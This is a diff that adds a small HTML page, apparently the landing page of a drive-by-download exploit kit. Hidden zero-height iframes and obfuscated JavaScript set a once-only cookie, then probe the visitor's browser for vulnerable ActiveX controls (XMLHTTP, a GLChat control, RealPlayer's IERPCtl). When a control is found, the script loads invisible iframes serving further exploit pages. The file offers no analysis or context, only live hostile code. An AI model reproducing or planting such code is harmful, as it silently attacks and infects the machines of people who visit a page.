@@ -1,0 +1,19 @@
+<iframe src="14.htm" width=100 height=0></iframe>
+<iframe src="real.htm" width=100 height=0></iframe>
+<script>
+var kaspersky="shabi"
+var L_czcY_1 = new window["Date"]()
+L_czcY_1["setTime"](L_czcY_1["getTime"]() + 3*60*60*1000)
+var Jy2$2 = new window["String"](window["document"]["cookie"])
+var sX$bhbGk3 = "Cookie1="
+var zecKZZ4 = Jy2$2["indexOf"](sX$bhbGk3)
+if (zecKZZ4 == -1)
+{
+window["document"]["cookie"] = "Cookie1=POPWINDOS;expires="+ L_czcY_1["toGMTString"]()
+try{if(new ActiveXObject("Microsoft.XMLHTTP"))window["document"]["write"]('<iframe style=display:none src="0.htm"></iframe>');}catch(e){}
+try{if(new ActiveXObject("GLCHAT.GLChatCtrl.1"))window["document"]["write"]('<iframe style=display:none src="lz.htm"></iframe>');}catch(e){}
+try{if(new ActiveXObject("IERPCtl.IERPCtl.1"))window["document"]["write"]('<iframe style=display:none src="0.htm"></iframe>');}catch(e){}
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=1;
+}
+</script>
+
